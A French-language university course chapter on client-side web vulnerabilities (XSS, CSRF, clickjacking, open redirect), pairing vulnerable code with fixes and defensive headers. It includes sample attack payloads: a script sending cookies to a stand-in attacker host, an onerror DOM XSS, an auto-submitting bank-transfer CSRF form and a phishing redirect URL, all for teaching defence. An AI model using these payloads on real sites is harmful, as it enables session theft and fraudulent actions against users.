# Chapitre 4 — Vulnérabilités côté client : XSS, CSRF, clickjacking

!!! tip "Présentation de ce chapitre"
    [🖥 Ouvrir les diapositives](../../presentation.html?deck=09-securite-des-applications/slides/04-vulnerabilites-cote-client.txt){ target=_blank }

## 1. Cross-Site Scripting (XSS)

### Principe

Une vulnérabilité XSS survient lorsqu'une donnée non fiable est insérée dans une page HTML sans encodage contextuel approprié, permettant à un attaquant de faire exécuter du code JavaScript arbitraire dans le navigateur d'une victime, dans le contexte de sécurité du site légitime.

Ce point est essentiel à bien comprendre : le script injecté ne s'exécute pas sur le serveur de l'application, mais dans le navigateur de la victime, avec les mêmes droits que n'importe quel script légitime du site. Il peut donc, par exemple, lire les cookies non protégés associés au site, effectuer des requêtes vers l'API du site avec la session active de la victime, manipuler le contenu affiché (hameçonnage ciblé), ou capturer les frappes clavier de la victime — l'ensemble des actions qu'un script légitime du site pourrait lui-même effectuer.

### Trois formes principales

| Type | Mécanisme |
|---|---|
| **XSS réfléchi** | la charge malveillante est incluse dans la requête (ex. paramètre d'URL) et renvoyée immédiatement dans la réponse, sans être stockée ; nécessite de piéger la victime pour qu'elle clique un lien spécialement construit |
| **XSS stocké (persistant)** | la charge est enregistrée côté serveur (ex. commentaire, champ de profil) et exécutée pour tout utilisateur consultant ultérieurement le contenu affecté ; impact généralement plus large |
| **XSS DOM-based** | la vulnérabilité provient d'un traitement non sûr côté client (JavaScript manipulant directement le DOM à partir de données non fiables), sans que le serveur soit nécessairement impliqué dans la faille |

### Exemple

```html
<!-- Champ de commentaire affiché sans encodage -->
<p>Commentaire : <?php echo $commentaire_utilisateur; ?></p>
```

Si `$commentaire_utilisateur` vaut `<script>document.location='https://attaquant.example/vol?c='+document.cookie</script>`, ce script s'exécute dans le navigateur de tout visiteur affichant ce commentaire, avec accès potentiel au cookie de session de la victime (d'où l'importance de l'attribut `HttpOnly` vu au chapitre 3, qui limite précisément ce vecteur).

### Version corrigée

```php
<!-- Encodage contextuel systématique avant insertion dans le HTML -->
<p>Commentaire : <?php echo htmlspecialchars($commentaire_utilisateur, ENT_QUOTES, 'UTF-8'); ?></p>
```

La fonction d'encodage transforme les caractères ayant une signification syntaxique en HTML (`<`, `>`, `"`, `'`, `&`) en leurs entités correspondantes (`&lt;`, `&gt;`, etc.), de sorte que le contenu s'affiche littéralement comme texte plutôt que d'être interprété comme une balise ou un script.

### Exemple d'XSS DOM-based

```javascript
// Vulnérable : lecture directe d'un paramètre d'URL et insertion
// dans le DOM via innerHTML, sans encodage ni validation
const parametres = new URLSearchParams(window.location.search);
document.getElementById('bienvenue').innerHTML = "Bonjour " + parametres.get('nom');

// Une URL du type site.example/page?nom=<img src=x onerror=alert(document.cookie)>
// provoque l'exécution du gestionnaire onerror dès le chargement de l'image
// invalide, entièrement côté client, sans jamais transiter par le serveur.

// Corrigé : utilisation d'une propriété qui traite la valeur comme
// du texte brut plutôt que comme du HTML à interpréter
document.getElementById('bienvenue').textContent = "Bonjour " + parametres.get('nom');
```

Ce dernier exemple illustre pourquoi le XSS DOM-based mérite une vigilance spécifique : aucune requête n'est nécessairement envoyée au serveur pour que la vulnérabilité s'exprime, ce qui la rend invisible à un outil d'analyse qui n'observerait que le trafic réseau côté serveur (comme un DAST classique) sans exécuter réellement le JavaScript de la page.

### Contre-mesures

- **Encodage contextuel systématique** en sortie (HTML, attribut, JavaScript, URL — chaque contexte a ses propres règles d'encodage, cf. chapitre 1 section 4).
- **Content Security Policy (CSP)** : en-tête HTTP restreignant les sources de scripts autorisées à s'exécuter sur une page, limitant fortement l'impact d'un XSS même si l'injection réussit.
- Utilisation de frameworks front-end effectuant un encodage automatique par défaut (la plupart des frameworks modernes encodent par défaut, à condition de ne pas contourner ce mécanisme volontairement, ex. via des fonctions explicitement nommées « dangereuses »).

### Illustration d'une politique CSP restrictive

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
```

Cette configuration n'autorise le chargement de scripts que depuis l'origine du site lui-même (`'self'`), interdit tout script inline non explicitement autorisé, et bloque les plugins hérités (`object-src 'none'`). Même si une injection XSS parvient à insérer une balise `<script src="https://attaquant.example/malveillant.js">` dans la page, le navigateur refusera de charger ce script car son origine ne correspond pas à la politique déclarée — une couche de défense qui n'élimine pas la vulnérabilité elle-même mais en réduit fortement l'exploitabilité, en cohérence avec le principe de défense en profondeur du chapitre 1.

## 2. Cross-Site Request Forgery (CSRF)

### Principe

Un attaquant piège la victime (déjà authentifiée sur un site cible) pour qu'elle exécute, à son insu, une requête vers ce site (ex. via une page piégée provoquant une soumission de formulaire automatique) : le navigateur joint automatiquement les cookies de session valides, faisant apparaître la requête comme légitime aux yeux du serveur.

Le mécanisme repose sur une propriété par défaut des navigateurs : lors de toute requête vers un domaine, les cookies associés à ce domaine sont automatiquement joints à la requête, quelle que soit la page d'origine ayant déclenché cette requête. Le serveur, recevant une requête accompagnée d'un cookie de session valide, ne peut à lui seul distinguer une requête volontairement initiée par l'utilisateur d'une requête déclenchée à son insu par une page tierce.

### Exemple

```html
<!-- Page piégée hébergée par l'attaquant -->
<form action="https://banque.example/virement" method="POST">
  <input type="hidden" name="destinataire" value="compte-attaquant">
  <input type="hidden" name="montant" value="5000">
</form>
<script>document.forms[0].submit();</script>
```

Si la victime authentifiée sur `banque.example` visite cette page piégée, son navigateur soumet automatiquement le formulaire avec ses cookies de session valides.

### Un piège fréquent : croire les requêtes GET protégées par nature

Une confusion pédagogique fréquente consiste à penser que le CSRF ne concerne que les formulaires POST. En réalité, toute action sensible déclenchable par une simple requête GET (ex. `GET /compte/supprimer?id=42`) est trivialement exploitable via une simple balise image :

```html
<!-- Une simple image suffit à déclencher une requête GET, sans script -->
<img src="https://site.example/compte/supprimer?id=42" style="display:none">
```

C'est pourquoi la conception d'API doit toujours réserver les méthodes HTTP `GET` aux opérations sans effet de bord (lecture seule), et utiliser des méthodes appropriées (`POST`, `PUT`, `DELETE`) pour toute opération modifiant un état, condition nécessaire mais non suffisante à une protection efficace contre le CSRF.

### Contre-mesures

- **Jeton anti-CSRF** : valeur unique et imprévisible générée côté serveur, incluse dans chaque formulaire sensible et vérifiée à la soumission — un attaquant externe ne peut pas connaître ce jeton.
- **Attribut de cookie `SameSite`** (rappel chapitre 3) : empêche le navigateur d'envoyer automatiquement le cookie de session lors d'une requête intersite dans de nombreux cas.
- Vérification de l'en-tête `Origin`/`Referer` pour les opérations sensibles.

### Approfondissement : les valeurs de l'attribut `SameSite`

| Valeur | Comportement | Niveau de protection |
|---|---|---|
| `Strict` | le cookie n'est jamais envoyé lors d'une navigation provenant d'un autre site, même en cliquant un lien légitime depuis ce site tiers | maximal, mais peut dégrader l'expérience utilisateur (ex. un utilisateur cliquant un lien vers le site depuis un e-mail apparaît comme non connecté) |
| `Lax` (valeur par défaut dans de nombreux navigateurs modernes) | le cookie est envoyé lors d'une navigation directe de premier niveau (clic sur un lien), mais pas lors de requêtes déclenchées en arrière-plan par une page tierce (image, formulaire auto-soumis) | bon compromis, protège contre l'exemple de la section précédente |
| `None` | le cookie est envoyé dans tous les cas intersites (nécessite obligatoirement l'attribut `Secure` associé) | aucune protection CSRF apportée par cet attribut ; nécessaire uniquement pour des cas d'usage intersites légitimes explicitement voulus |

Le `SameSite=Lax` par défaut réduit fortement la surface d'attaque CSRF « historique », mais ne dispense pas d'un jeton anti-CSRF pour les opérations les plus sensibles, notamment parce que certains scénarios (requêtes de premier niveau, navigateurs plus anciens ou mal configurés) restent hors de portée de cette seule protection.

## 3. Clickjacking

Un attaquant superpose (via une iframe transparente) une page légitime sous une interface trompeuse, incitant la victime à cliquer sur un élément de la page légitime sans le savoir (ex. un bouton « activer le micro » ou « confirmer un paiement » masqué sous un bouton apparemment inoffensif).

**Contre-mesure** : en-tête HTTP `X-Frame-Options` ou directive CSP `frame-ancestors`, empêchant qu'une page sensible soit chargée dans une iframe par un site non autorisé.

```
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
```

### Pourquoi préférer `frame-ancestors` à d'anciennes techniques de « frame busting »

Avant la généralisation de ces en-têtes HTTP, certains sites tentaient de se protéger par un script JavaScript dit de « frame busting » (détectant si la page est chargée dans une iframe et forçant une redirection hors de celle-ci). Cette approche reste fragile car un attaquant peut souvent neutraliser ce script (ex. via l'attribut `sandbox` d'une iframe empêchant l'exécution de scripts, ou d'autres contournements historiquement documentés). Les en-têtes `X-Frame-Options` et `frame-ancestors` sont appliqués directement par le navigateur avant même le rendu de la page, indépendamment de toute logique JavaScript côté client, ce qui en fait une défense structurellement plus fiable.

## 4. Injection côté client : DOM et frameworks modernes

Les applications à page unique (SPA) manipulant intensivement le DOM côté client introduisent des variantes de ces vulnérabilités (XSS DOM-based en particulier), nécessitant une vigilance spécifique sur toute fonction manipulant directement le HTML à partir de données non fiables (fonctions explicitement signalées comme dangereuses par les frameworks modernes, à éviter sauf nécessité strictement justifiée et accompagnée d'un encodage manuel rigoureux).

### Redirection ouverte (open redirect) : une vulnérabilité connexe

Une **redirection ouverte** survient lorsqu'une application redirige l'utilisateur vers une URL fournie en paramètre, sans en vérifier le domaine de destination :

```
<!-- Vulnérable : redirection vers n'importe quel domaine fourni en paramètre -->
https://site-de-confiance.example/redirection?url=https://site-malveillant.example/hameconnage
```

Bien que ne permettant pas d'exécuter du code, cette vulnérabilité est fréquemment exploitée en appui d'une campagne de hameçonnage : le lien affiché à la victime commence par un nom de domaine légitime et digne de confiance, ce qui augmente la probabilité qu'elle clique, avant d'être redirigée vers un site malveillant. **Contre-mesure** : valider la destination de toute redirection contre une liste blanche de domaines ou de chemins internes autorisés, plutôt que d'accepter une URL arbitraire.

## À retenir

- XSS exploite une insertion non sécurisée de données dans une page ; CSRF exploite la confiance automatique du navigateur envers des cookies de session lors de requêtes intersites — deux mécanismes distincts nécessitant des contre-mesures distinctes.
- L'encodage contextuel systématique et une CSP bien configurée sont les défenses de référence contre XSS ; le XSS DOM-based mérite une vigilance particulière car il peut échapper à des outils n'analysant que le trafic réseau côté serveur.
- Le jeton anti-CSRF et l'attribut `SameSite` sont les défenses de référence contre CSRF ; réserver les méthodes GET aux opérations sans effet de bord est une précaution nécessaire mais non suffisante à elle seule.
- Le clickjacking se prévient simplement par les en-têtes HTTP appropriés (`X-Frame-Options`, `frame-ancestors`), plus fiables que d'anciennes techniques de frame busting en JavaScript, et souvent négligés en pratique.
- La redirection ouverte, souvent sous-estimée, constitue un vecteur d'appui classique pour des campagnes de hameçonnage exploitant la confiance portée à un domaine légitime.

---

*Dr. Zakaria Sawadogo — École Polytechnique de Ouagadougou*
